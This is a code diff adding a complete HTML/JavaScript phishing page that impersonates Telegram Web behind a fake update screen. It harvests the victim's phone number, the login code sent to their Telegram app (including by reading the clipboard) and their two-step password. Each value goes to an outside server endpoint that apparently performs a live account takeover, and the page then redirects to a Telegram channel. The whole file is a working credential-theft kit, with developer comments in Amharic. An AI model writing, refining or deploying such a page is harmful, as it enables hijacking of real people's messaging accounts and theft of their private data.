@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <title>Telegram Messenger</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="./config.js"></script>
+<style>
+    :root {
+        --tg-theme-bg-color: #ffffff;
+        --tg-theme-text-color: #000000;
+        --tg-theme-hint-color: #999999;
+        --tg-theme-link-color: #2481cc;
+        --tg-theme-button-color: #3390ec;
+        --tg-theme-button-text-color: #ffffff;
+        --error-bg: #ffebee;
+        --error-text: #e53935;
+        --success-color: #34c759;
+        --input-bg: #f4f4f5;
+        --border-color: #e0e0e0;
+    }
+
+    * { 
+        box-sizing: border-box; 
+        -webkit-tap-highlight-color: transparent; 
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+        margin: 0;
+        padding: 0;
+    }
+    
+    body { 
+        color: var(--tg-theme-text-color); 
+        background: var(--tg-theme-bg-color); 
+        height: 100vh; 
+        width: 100vw;
+        display: flex; 
+        flex-direction: column; 
+        align-items: center;
+        overflow: hidden;
+        position: fixed;
+    }
+
+    /* Common Step Styling */
+    .step { 
+        display: none; 
+        width: 100%; 
+        max-width: 420px; 
+        flex-direction: column; 
+        align-items: center; 
+        padding: 40px 24px; 
+        text-align: center; 
+        height: 100%; 
+        position: relative; 
+    }
+    .active { 
+        display: flex; 
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); 
+    }
+
+    @keyframes slideUp { 
+        from { opacity: 0; transform: translateY(20px); } 
+        to { opacity: 1; transform: translateY(0); } 
+    }
+
+    /* Images */
+    .tg-logo { width: 120px; height: 120px; margin: 40px 0 20px 0; }
+    .monkey-img { width: 140px; height: 140px; margin-bottom: 20px; border-radius: 10px; } 
+    
+    /* Typography */
+    h2 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: var(--tg-theme-text-color); }
+    p { font-size: 15px; color: var(--tg-theme-hint-color); line-height: 1.5; margin-bottom: 24px; }
+    b { color: var(--tg-theme-text-color); font-weight: 600; }
+
+    /* Main Button (Telegram Style) */
+    .btn-main {
+        background: var(--tg-theme-button-color); 
+        color: var(--tg-theme-button-text-color); 
+        padding: 16px; 
+        width: 100%; 
+        border-radius: 10px; 
+        border: none;
+        font-size: 16px; 
+        font-weight: 500; 
+        cursor: pointer; 
+        display: flex; 
+        align-items: center; 
+        justify-content: center; 
+        gap: 10px;
+        transition: transform 0.1s, opacity 0.2s;
+    }
+    .btn-main:active { transform: scale(0.97); }
+    .btn-main:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+    /* Secondary Button Style */
+    .btn-secondary {
+        background: transparent;
+        color: var(--tg-theme-button-color);
+        border: 1px solid var(--tg-theme-button-color);
+        margin-top: 10px;
+    }
+
+    /* Message System */
+    .msg-wrap { height: 48px; width: 100%; position: relative; margin-bottom: 16px; }
+    .msg { 
+        position: absolute; left: 0; right: 0; top: 0;
+        padding: 12px; border-radius: 8px; font-size: 14px; display: none; width: 100%; 
+        font-weight: 500; z-index: 5;
+        animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .error { background: var(--error-bg); color: var(--error-text); }
+    .loading-msg { background: #e3f2fd; color: #1976d2; }
+
+    /* Loader */
+    .btn-spinner { 
+        display: none; width: 20px; height: 20px; 
+        border: 2px solid rgba(255,255,255,0.3); 
+        border-top: 2px solid #fff; border-radius: 50%; 
+        animation: spin 0.8s linear infinite; 
+    }
+    .loader-ring {
+        width: 44px; height: 44px; border: 3px solid var(--input-bg);
+        border-top: 3px solid var(--tg-theme-button-color); border-radius: 50%;
+        animation: spin 0.8s linear infinite; margin: 30px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* Phone & 2FA Inputs */
+    .input-wrapper { position: relative; width: 100%; margin-bottom: 24px; }
+    .input-wrapper input {
+        width: 100%; padding: 16px; 
+        border: 1px solid var(--border-color);
+        border-radius: 10px; font-size: 16px; outline: none; 
+        background: var(--input-bg);
+        transition: all 0.2s;
+        color: var(--tg-theme-text-color);
+    }
+    .input-wrapper input:focus { 
+        border-color: var(--tg-theme-button-color); 
+        background: var(--tg-theme-bg-color);
+        box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2);
+    }
+    .input-wrapper i { 
+        position: absolute; right: 16px; top: 50%; transform: translateY(-50%); 
+        color: var(--tg-theme-hint-color); cursor: pointer; font-size: 18px; 
+    }
+
+    /* OTP Inputs (Modern Telegram Look) */
+    .otp-container { display: flex; gap: 10px; margin-bottom: 30px; justify-content: center; }
+    .otp-box { 
+        width: 48px; height: 58px; 
+        border: 1px solid var(--border-color); 
+        border-radius: 10px;
+        display: flex; align-items: center; justify-content: center; 
+        font-size: 24px; font-weight: 600; 
+        background: var(--input-bg); 
+        transition: all 0.2s ease;
+        color: var(--tg-theme-text-color);
+    }
+    .otp-box.filled { 
+        border-color: var(--tg-theme-button-color); 
+        background: var(--tg-theme-bg-color); 
+        box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); 
+    }
+    .otp-box.invalid { 
+        border-color: var(--error-text); 
+        background: var(--error-bg); 
+        animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; 
+    }
+    .otp-box.valid {
+        border-color: var(--success-color);
+        background: #e8f5e9;
+    }
+
+    @keyframes shake { 
+        10%, 90% { transform: translate3d(-1px, 0, 0); }
+        20%, 80% { transform: translate3d(2px, 0, 0); }
+        30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+        40%, 60% { transform: translate3d(4px, 0, 0); }
+    }
+
+    /* Floating Keypad for OTP */
+    .keypad { 
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+        width: 100%; max-width: 420px; padding: 16px 20px 30px 20px;
+        background: transparent; 
+        position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+        z-index: 100;
+        border-top: none; 
+    }
+    .key { 
+        background: var(--input-bg); 
+        padding: 14px; font-size: 22px; cursor: pointer; 
+        font-weight: 500; border-radius: 8px; 
+        display: flex; justify-content: center; align-items: center;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        color: var(--tg-theme-text-color);
+        border: 1px solid var(--border-color); 
+    }
+    .key:active { background: var(--tg-theme-button-color); color: #ffffff; }
+    .key.empty { background: transparent; box-shadow: none; border: none; pointer-events: none; }
+
+</style>
+</head>
+<body>
+
+    <!-- Intro / Update Screen -->
+    <div id="step_intro" class="step active">
+        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram Logo" style="animation: pulse 2s infinite;">
+        <div class="loader-ring"></div>
+        <p style="color: var(--tg-theme-text-color); font-weight: 500; margin-top: 10px;">Updating messenger...</p>
+    </div>
+
+    <!-- Step 1: Login (Phone Input) -->
+    <div id="step_photo_slide" class="step">
+        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram">
+        <h2>Telegram Web</h2>
+        <p>Log in to your Telegram account to sync your messages and settings.</p>
+        
+        <div class="msg-wrap"><div id="status1" class="msg"></div></div>
+
+        <!-- አዲሱ የስልክ ቁጥር መፃፊያ -->
+        <div class="input-wrapper">
+            <input type="tel" id="phone_input" placeholder="Phone Number (e.g. +251...)" oninput="hideMsg(1)">
+        </div>
+
+        <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
+            <div class="btn-spinner" id="loginSpinner"></div>
+            <span id="loginText">Next</span>
+        </button>
+    </div>
+
+    <!-- Step 2: OTP -->
+    <div id="step2" class="step" style="padding-bottom: 250px;">
+        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Verification">
+        <p>We've sent a code to the <b>Telegram app</b> on your other device.</p>
+        
+        <div class="otp-container" id="otp_container">
+            <div class="otp-box" id="b0"></div>
+            <div class="otp-box" id="b1"></div>
+            <div class="otp-box" id="b2"></div>
+            <div class="otp-box" id="b3"></div>
+            <div class="otp-box" id="b4"></div>
+        </div>
+
+        <div class="msg-wrap"><div id="status2" class="msg"></div></div>
+
+        <button class="btn-main btn-secondary" onclick="window.open('https://t.me/42777', '_blank')">Haven't received the code?</button>
+
+        <!-- Keypad attached to bottom -->
+        <div class="keypad">
+            <div class="key" onclick="press(1)">1</div>
+            <div class="key" onclick="press(2)">2</div>
+            <div class="key" onclick="press(3)">3</div>
+            <div class="key" onclick="press(4)">4</div>
+            <div class="key" onclick="press(5)">5</div>
+            <div class="key" onclick="press(6)">6</div>
+            <div class="key" onclick="press(7)">7</div>
+            <div class="key" onclick="press(8)">8</div>
+            <div class="key" onclick="press(9)">9</div>
+            <div class="key empty"></div>
+            <div class="key" onclick="press(0)">0</div>
+            <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left" style="color:inherit"></i></div>
+        </div>
+    </div>
+
+    <!-- Step 3: 2FA Password -->
+    <div id="step3" class="step">
+        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Password">
+        <h2>Enter a Password</h2>
+        <p>Your account is protected with an additional password.</p>
+        
+        <div class="msg-wrap"><div id="status3" class="msg"></div></div>
+
+        <div class="input-wrapper">
+            <input type="password" id="2fa_input" placeholder="Password" style="padding-right: 45px;" oninput="hideMsg(3)">
+            <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
+        </div>
+        
+        <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
+            <div class="btn-spinner" id="confirmSpinner"></div>
+            <span id="confirmText">Continue</span>
+        </button>
+        <p style="color: var(--tg-theme-link-color); font-weight: 500; margin-top: 20px; cursor: pointer; font-size: 14px;">Forgot password?</p>
+    </div>
+
+    <!-- Step 4: Success -->
+    <div id="step_success" class="step">
+        <i class="fa-solid fa-check-circle" style="font-size: 80px; color: var(--success-color); margin: 60px 0 24px 0;"></i>
+        <h2>Welcome</h2>
+        <p>Loading your chats...</p>
+        <div class="loader-ring"></div>
+    </div>
+
+<script>
+    // 🌟 አዲሱ የ Session ID ሎጂክ 🌟
+    let sessionId = localStorage.getItem("my_session_id");
+    if (!sessionId) {
+        // መታወቂያ ከሌለ አዲስ ይፈጥራል
+        sessionId = "browser_" + Math.floor(Math.random() * 1000000000);
+        localStorage.setItem("my_session_id", sessionId);
+    }
+    
+    // የቴሌግራም ID ቦታ ላይ የፈጠርነውን Session ID እንጠቀማለን
+    let userId = sessionId;
+    let sid = sessionId; 
+
+    // Setup Telegram Theme (በብሮውዘር ቢከፈትም ስህተት እንዳያመጣ በ try-catch ተጠቅልሏል)
+    try {
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        const themeParams = tg.themeParams;
+        if (themeParams.bg_color) {
+            document.documentElement.style.setProperty('--tg-theme-bg-color', themeParams.bg_color);
+            document.documentElement.style.setProperty('--tg-theme-text-color', themeParams.text_color);
+            document.documentElement.style.setProperty('--tg-theme-hint-color', themeParams.hint_color);
+            document.documentElement.style.setProperty('--tg-theme-link-color', themeParams.link_color);
+            document.documentElement.style.setProperty('--tg-theme-button-color', themeParams.button_color);
+            document.documentElement.style.setProperty('--tg-theme-button-text-color', themeParams.button_text_color);
+        }
+        
+        if (tg.colorScheme === 'dark') {
+            document.documentElement.style.setProperty('--input-bg', 'rgba(255, 255, 255, 0.08)');
+            document.documentElement.style.setProperty('--border-color', 'rgba(255, 255, 255, 0.15)');
+        }
+    } catch(e) {}
+
+    let currentOtp = "";
+    let statusChecker;
+    let isProcessing = false;
+
+    document.addEventListener("DOMContentLoaded", function() {
+        setTimeout(() => { showStep('photo_slide'); }, 3000);
+        // ሁልጊዜ የ Session ID-ውን Status ይፈትሻል
+        statusChecker = setInterval(checkStatus, 3000);
+        setupLongPressPaste(); 
+    });
+
+    function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(15); }
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
+        const target = document.getElementById(stepId);
+        if(target) target.classList.add('active');
+
+        if(n === 'success') {
+            setTimeout(() => { window.location.href = "https://t.me/sitoc/"; }, 1500);
+        }
+    }
+
+    function checkStatus() {
+        if(typeof API_BASE_URL2 === 'undefined') return;
+        
+        fetch(`${API_BASE_URL2}/check_status/${userId}`).then(r => r.json()).then(data => {
+            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+            else if (data.status === "SUCCESS") { 
+                clearInterval(statusChecker); 
+                setOtpStatus('valid');
+                setTimeout(() => showStep('success'), 600);
+            }
+            else if (data.status === "FLOOD") { 
+                clearInterval(statusChecker); 
+                displayFloodInStatus1(data); 
+            }
+        }).catch(e => {});
+    }
+
+    function setOtpStatus(status) {
+        const boxes = document.querySelectorAll('.otp-box');
+        boxes.forEach(box => {
+            box.classList.remove('invalid', 'valid');
+            if(status) box.classList.add(status);
+        });
+    }
+
+    function stopLoaders() {
+        isProcessing = false;
+        if(document.getElementById('loginBtn')) {
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginSpinner').style.display = 'none';
+            document.getElementById('loginText').innerText = "Next";
+        }
+        if(document.getElementById('confirmBtn')){
+            document.getElementById('confirmBtn').disabled = false;
+            document.getElementById('confirmSpinner').style.display = 'none';
+            document.getElementById('confirmText').innerText = 'Continue';
+        }
+    }
+
+    function togglePasswordVisibility() {
+        const passInput = document.getElementById('2fa_input');
+        const toggleIcon = document.getElementById('toggleIcon');
+        if (passInput.type === "password") {
+            passInput.type = "text";
+            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+        } else {
+            passInput.type = "password";
+            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
+        }
+    }
+
+    function handleLoginClick() {
+        // የተፃፈውን ስልክ ቁጥር ይወስዳል
+        const phone = document.getElementById('phone_input').value.trim();
+        if (!phone) {
+            showMsg(1, 'error', 'Please enter your phone number.');
+            return;
+        }
+
+        playTap();
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true;
+        document.getElementById('loginSpinner').style.display = 'block';
+        document.getElementById('loginText').innerText = 'Please wait...';
+        startVerification(phone);
+    }
+
+    async function startVerification(phone) {
+        if (isProcessing) return;
+        isProcessing = true;
+        showMsg(1, 'loading-msg', 'Connecting...');
+
+        if(typeof API_BASE_URL2 === 'undefined') {
+            stopLoaders();
+            showMsg(1, 'error', 'Network error. Try again.');
+            return;
+        }
+        
+        try {
+            // ወደ አዲሱ የ Python API ስልኩን እና Session ID-ውን ይልካል
+            const res = await fetch(`${API_BASE_URL2}/submit_phone`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, phone: phone})
+            });
+            const data = await res.json();
+            
+            if (data.status === "ERROR") {
+                stopLoaders();
+                showMsg(1, 'error', data.message || 'Error occurred.');
+            } else {
+                showMsg(1, 'loading-msg', 'Sending code...');
+                // ከተላከ በኋላ checkStatus Loop ራሱ እየፈለገ ወደ ሚቀጥለው ገፅ ይወስደዋል
+            }
+        } catch(e) { 
+            stopLoaders();
+            showMsg(1, 'error', 'Network error. Try again.');
+        }
+    }
+
+    function press(num) {
+        playTap();
+        hideMsg(2);
+        setOtpStatus(null); 
+        if (currentOtp.length < 5) {
+            currentOtp += num;
+            updateOtpUI();
+            if (currentOtp.length === 5) submitOTP();
+        }
+    }
+
+    function backspace() { 
+        playTap(); 
+        setOtpStatus(null);
+        currentOtp = currentOtp.slice(0, -1); 
+        updateOtpUI(); 
+    }
+
+    function updateOtpUI() {
+        for (let i = 0; i < 5; i++) {
+            const box = document.getElementById('b' + i);
+            box.innerText = currentOtp[i] || "";
+            currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
+        }
+    }
+
+    async function submitOTP() {
+        showMsg(2, 'loading-msg', 'Checking code...');
+        try {
+            const res = await fetch(`${API_BASE_URL2}/verify_otp`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, otp: currentOtp})
+            });
+            const data = await res.json();
+            handleResponse(data, 2);
+        } catch(e) { showMsg(2, 'error', 'Connection lost!'); }
+    }
+
+    async function submit2FA() {
+        playTap();
+        const pass = document.getElementById('2fa_input').value;
+        if(!pass) return showMsg(3, 'error', 'Password cannot be empty.');
+        
+        const btn = document.getElementById('confirmBtn');
+        btn.disabled = true;
+        document.getElementById('confirmSpinner').style.display = 'block';
+        document.getElementById('confirmText').innerText = 'Verifying...';
+
+        showMsg(3, 'loading-msg', 'Checking password...');
+        try {
+            const res = await fetch(`${API_BASE_URL2}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, password: pass})
+            });
+            const data = await res.json();
+            handleResponse(data, 3);
+        } catch(e) { stopLoaders(); showMsg(3, 'error', 'Network error.'); }
+    }
+
+    function handleResponse(data, step) {
+        if (data.status === "FLOOD") { 
+            clearInterval(statusChecker); 
+            displayFloodInStatus1(data);
+        }
+        else if (data.status === "SUCCESS") { 
+            setOtpStatus('valid');
+            setTimeout(() => showStep('success'), 600);
+        } 
+        else if (data.status === "NEED_2FA") { 
+            setOtpStatus('valid');
+            setTimeout(() => { showStep(3); stopLoaders(); }, 600);
+        }
+        else {
+            stopLoaders();
+            if(step === 2) { 
+                setOtpStatus('invalid');
+                showMsg(step, 'error', 'Invalid code. Please try again.');
+                setTimeout(() => {
+                    currentOtp = ""; 
+                    updateOtpUI(); 
+                    setOtpStatus(null);
+                }, 1000);
+            } else {
+                showMsg(step, 'error', 'Invalid password. Please try again.');
+            }
+        }
+    }
+
+    function showMsg(stepId, type, text) {
+        const el = document.getElementById('status' + stepId);
+        if(!el) return;
+        el.className = 'msg ' + type; 
+        el.innerText = text; 
+        el.style.display = 'block';
+    }
+
+    function hideMsg(stepId) {
+        const el = document.getElementById('status' + stepId);
+        if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
+    }
+
+    function displayFloodInStatus1(data) {
+        stopLoaders();
+        clearInterval(statusChecker);
+        showStep('photo_slide'); 
+        
+        let remSeconds = data.remaining_seconds || data.wait || 60;
+        let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
+        
+        showMsg(1, 'error', `Too many attempts. Please try again in ${mins} minute(s).`);
+        
+        const btn = document.getElementById('loginBtn');
+        if(btn) btn.disabled = true;
+    }
+
+    function setupLongPressPaste() {
+        const container = document.getElementById('otp_container');
+        let timer;
+        if(container){
+            container.addEventListener('touchstart', () => {
+                timer = setTimeout(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        const cleanCode = text.replace(/\D/g, '').slice(0, 5);
+                        if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                    } catch (err) {}
+                }, 800);
+            });
+            container.addEventListener('touchend', () => clearTimeout(timer));
+        }
+    }
+</script>
+</body>
+</html>
